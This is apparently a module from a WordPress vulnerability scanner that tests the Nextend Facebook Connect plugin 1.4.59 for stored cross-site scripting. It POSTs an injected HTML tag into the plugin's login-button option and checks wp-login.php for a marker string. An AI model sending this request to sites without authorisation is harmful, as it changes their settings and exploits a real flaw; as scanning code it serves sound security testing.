from ..exploitxss import ExploitXSS


class NextendFacebookConnect(ExploitXSS):
	@staticmethod
	def getname():
		return 'Nextend Facebook Connect'

	@staticmethod
	def getversion():
		return '1.4.59'

	@staticmethod
	def getexploiturl():
		return 'http://www.exploit-db.com/exploits/35439/'

	def exploit(self):
		name = self.getname()
		version = self.getversion()
		exploit = 'newfb_update_options=Y&fb_login_button=<link href="vulnpress"/>'
		hostname = self.hostname

		ExploitXSS.request(hostname, data=exploit, method='POST')

		response = ExploitXSS.request(hostname + '/wp-login.php')

		if "vulnpress" in response:
			ExploitXSS.exploitfound(name, version, self.getexploiturl())
		else:
			ExploitXSS.exploitnotfound(name, version)
